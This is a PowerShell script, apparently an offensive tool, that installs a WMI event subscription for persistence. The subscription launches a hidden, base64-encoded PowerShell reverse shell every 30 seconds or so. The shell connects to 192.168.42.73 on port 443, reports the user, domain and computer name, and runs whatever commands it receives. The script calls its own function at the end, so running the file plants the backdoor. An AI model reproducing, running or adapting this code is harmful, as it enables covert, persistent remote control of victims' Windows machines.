Function Invoke-Persistence {
	
	#create event filter
	$instanceFilter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance()
	$instanceFilter.QueryLanguage = 'WQL'
	$instanceFilter.Query = "Select * From __InstanceModificationEvent Within 5 Where TargetInstance ISA 'Win32_LocalTime' And (TargetInstance.Second=15 Or TargetInstance.Second=45)"
	$instanceFilter.EventNamespace = 'root\cimv2'
	$instanceFilter.Name = 'FilterPersistance'
	$result = $instanceFilter.Put()
	$filter = $result.Path

	#create event consumer
	
	$command = {

		Function Connect-TCPShell {
			[CmdletBinding()]
			Param(
				[Parameter(Mandatory=$true)]
				[ipaddress]$IPAddress,

				[Parameter()]
				[ValidateRange(1, 65535)]
				[uint32]$Port = 4444
			)
			
			try {
				
				$client = New-Object System.Net.Sockets.TcpClient($IPAddress, $Port)

				$receive = New-Object byte[] 65535

				$send = [System.Text.Encoding]::ASCII.GetBytes("$env:USERNAME@$env:USERDOMAIN/$env:COMPUTERNAME")

				$stream = $client.GetStream()
				$stream.Write($send, 0, $send.Length)

				while( ($n=$stream.read($receive, 0, $receive.Length) ) -ne 0 ){
					$command = [System.Text.Encoding]::ASCII.GetString($receive, 0, $n)
					try {
						$results = (Invoke-Expression -Command $command *>&1 | Out-String)
					} catch {
						$results += $Error[0]
						$Error.Clear()
					}
				
					$results += "`n"

					$send = [System.Text.Encoding]::ASCII.GetBytes($results)
					$stream.Write($send, 0, $send.Length)
					$stream.Flush()
				}
				$client.Close()
			} catch {}
		}

		Connect-TCPShell -IPAddress 192.168.42.73 -Port 443
	}.ToString()

	[byte[]]$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
	$encodedCommand = [System.Convert]::ToBase64String($bytes)
	$exeCommand = "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -WindowStyle Hidden -encodedCommand $encodedCommand"

	$instanceConsumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance()
	$instanceConsumer.Name = 'ConsumerExe'
	$instanceConsumer.CommandLineTemplate = $exeCommand
	$result = $instanceConsumer.Put()
	$consumer = $result.Path

	#bind event filter to consumer
	$instanceBinding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance()
	$instanceBinding.Filter = $filter
	$instanceBinding.Consumer = $consumer
	$result = $instanceBinding.Put()
	$binding = $result.Path

}

Invoke-Persistence
